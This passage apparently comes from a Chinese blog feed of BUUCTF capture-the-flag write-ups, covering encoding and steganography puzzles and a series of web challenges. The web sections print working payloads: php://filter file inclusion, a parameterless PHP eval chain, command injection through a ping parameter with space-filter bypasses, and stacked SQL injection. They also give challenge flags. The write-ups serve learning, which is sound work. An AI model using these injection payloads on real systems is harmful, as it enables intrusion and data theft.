+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++</span><br><span class="line">       ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;</span><br></pre></td></tr></table></figure>
<p>明显是brainfuck，解密即可flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p>
<h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>给了一张图片，用winhex打开后，发现从中间开始直到最后都是一长串的16进制，把16进制转为ASCII码，发现是一些坐标，就像图片的坐标，就想着用绘图工具gnuplot，不过得先修改坐标的格式，用python脚本跑一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">with open(<span class="string">'ASCII.txt'</span>,<span class="string">'r'</span>)as a:</span><br><span class="line">    a=a.read()</span><br><span class="line">a=a.split()</span><br><span class="line">temp=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(a)):</span><br><span class="line">    temp=a[i]</span><br><span class="line">    temp=temp.lstrip(<span class="string">'('</span>)</span><br><span class="line">    temp=temp.rstrip(<span class="string">')'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(0,len(temp)):</span><br><span class="line">        <span class="keyword">if</span> temp[j]==<span class="string">','</span>:</span><br><span class="line">            temp=temp[:j]+<span class="string">' '</span>+temp[j+1:]</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure>
<p>结果保存到result.txt文本里<br>然后用gnuplot<br>下面是gnuplot命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plot <span class="string">"result.txt"</span> lt 8</span><br></pre></td></tr></table></figure>
<p>绘制后是一个二维码，扫后拿到flag{40fc0a979f759c8892f4dc045e28b820}</p>
<h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>图片隐写，kali分离出两个文件，cipher和key<br>key中的内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</span><br></pre></td></tr></table></figure>
<p>是base64编码，解码后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is Nicki Minaj<span class="string">'s favorite song that refers to snakes?</span></span><br></pre></td></tr></table></figure>
<p>去搜了一下Nicki Minaj,发现《Anaconda》在美国公告牌单曲榜上最高名次为第2名，是妮琪·米娜成绩最高的歌曲之一。<br>snake密码：<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a><br>key值：anaconda,<br>密文为cipher的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DC44158CD6A283B543B412F716A7D1FDD210D8EB9E8937E23560F9EE240131BF1CE75CABB68EBFDA83730C728DBC748D</span><br></pre></td></tr></table></figure>
<p>解密后为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CTF&#123;who_knew_serpent_cipher_existed&#125;</span><br></pre></td></tr></table></figure>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>压缩包打开后是一个flag.vmdk,但是文件图表还是压缩包，直接360压缩打开，有两个文件，一个是key_part_one,另一个是key_part_two，key_part_one打开后啥也没有，key_part_two打开后是一段Ook编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure>
<p>解码后为_i5_funny!}，只有后半块<br>那前半块应该就在key_part_one文件中，但是打开啥也没有啊，我麻了！！！<br>看了大佬的wp,说是用7z打开就能看见，我又去下了个7z，果然有效，打开后是brainfuck</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----</span><br><span class="line">&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++</span><br><span class="line">++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure>
<p>解码后为flag{N7F5_AD5<br>将两个拼接起来flag{N7F5_AD5_i5_funny!}<br>去找了很多wp也没说为什么用7z打开就可以</p>
<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>D盾扫描该文件<br><img src="http://q63cs67co.bkt.clouddn.com/buuctf_webshell_1.PNG" alt=""><br>在第一个文件中找到了flag<br><img src="http://q63cs67co.bkt.clouddn.com/buuctf_webshell_2.PNG" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF-Web</title>
    <url>/2020/03/14/BUUCTF-Web/</url>
    <content><![CDATA[<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p><img src="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG" alt=""><br>一个登陆框，登录名应该是admin，直接爆破<br>密码爆破后为123<br>登陆成功，拿到flag</p>
<a id="more"></a>
<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>f12查看源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开始以为echo出的就是flag,结果不是<br>那就传入参数?cat=dog,flag就出来了</p>
<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>在源码中发现<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_0.PNG" alt=""><br>点进去后<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_1.PNG" alt=""><br>进入链接后<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_2.PNG" alt=""><br>用burp抓包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_3.PNG" alt=""><br>访问secr3t.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">"../"</span>)||stristr(<span class="variable">$file</span>, <span class="string">"tp"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"input"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>文件包含</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_4.PNG" alt=""><br>base64解码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_5.PNG" alt=""></p>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_0.PNG" alt=""><br>直接用菜刀连<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_1.PNG" alt=""></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_0.PNG" alt=""><br>访问Secret.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_1.PNG" alt=""><br>应该是要伪造Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_2.PNG" alt=""><br>修改UA:Syclover<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_3.PNG" alt=""></p>
<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_0.PNG" alt=""><br>显然是文件包含</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>base64解码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_1.PNG" alt=""></p>
<h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>根据题目，应该是考察备份文件<br>访问index.php.bak,打开后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>php弱类型比较,$str会被处理为123<br>payload:?key=123</p>
<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令执行漏洞<br><img src="" alt=""><br>ls 没发现flag相关文件，直接cat /flag,flag就出来了</p>
<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>打开啥也没有<br>bp、dirsearch、GitHacker全上了一遍<br>在GitHacker中扫出来了index.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                // <span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'exp'</span>];</span><br><span class="line">                @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>过滤了php伪协议，使用的函数不能带参数，一些基本函数也被过滤了，明显是无参RCE<br>只能利用一些特殊函数来构造exp了<br>第一步，扫描当前目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GXYCTF2019_REC/rce.jpg" alt=""><br>此时flag.php在数组中的第三个，接下来就是要想办法读取flag.php的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>current(localeconv())来构造出获取当前目录的’.’<br>array_reverse():以相反的元素顺序返回数组<br>next():将内部指针指向数组中的下一个元素，并输出<br>highlight_file():打印输出或者返回文件中语法高亮的代码</p>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce0.jpg" alt=""><br>get方式传入参数ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce1.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p>命令执行漏洞<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce2.jpg" alt=""><br>发现了flag.php，接下来就是要想办法读出flag<br>测试一下cat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce3.jpg" alt=""><br>看来过滤了空格，可以使用’,’代替，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|&#123;cat,flag.php&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg" alt=""><br>看来把’{}’也过滤了,使用内联执行绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat<span class="variable">$IFS</span><span class="variable">$1</span>`ls`</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg" alt=""></p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$img</span>)&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = array(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,<span class="variable">$filter_arr</span>).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">''</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="built_in">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'function'</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'phpinfo();'</span>); //maybe you can find something <span class="keyword">in</span> here!</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码最下方发现如果$function == ‘phpinfo’，就可以访问phpinfo，它说那里有提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?f=phpinfo</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg" alt=""><br>接下来就是想办法读取d0g3_f1ag.php</p>
<h3 id="强网杯-2019-随便注-堆叠注入、预编译绕过"><a href="#强网杯-2019-随便注-堆叠注入、预编译绕过" class="headerlink" title="[强网杯 2019]随便注(堆叠注入、预编译绕过)"></a>[强网杯 2019]随便注(堆叠注入、预编译绕过)</h3><p>测试注入点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">'          //报错</span></span><br><span class="line"><span class="string">1'</span> --+      //没报错</span><br></pre></td></tr></table></figure>
<p>单引号注入，判断一下列数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">' order by 2 --+       列数为3时报错，说明只有两列</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">' union select 1,2 --+</span></span><br></pre></td></tr></table></figure>
<p>返回了一段代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure>
<p>对关键字进行了过滤，我也不知道咋绕过啊，大佬说利用堆叠注入绕过过滤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';show tables --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easy_sql0.jpg" alt=""><br>发现有两个表，挨个爆字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';show columns from `1919810931114514` --+         这里表名要加反引号,不是单引号</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql1.jpg" alt=""><br>不用爆words表了，接下里就是要查flag，但是关键字被过滤了。这里可以利用预编译绕过select限制<br>预编译相关语法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>:用于设置变量名和变量值</span><br><span class="line">prepare:用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute:执行预备的语句</span><br><span class="line">deallocate prepare:释放预处理语句</span><br></pre></td></tr></table></figure>
<p>payload</p>
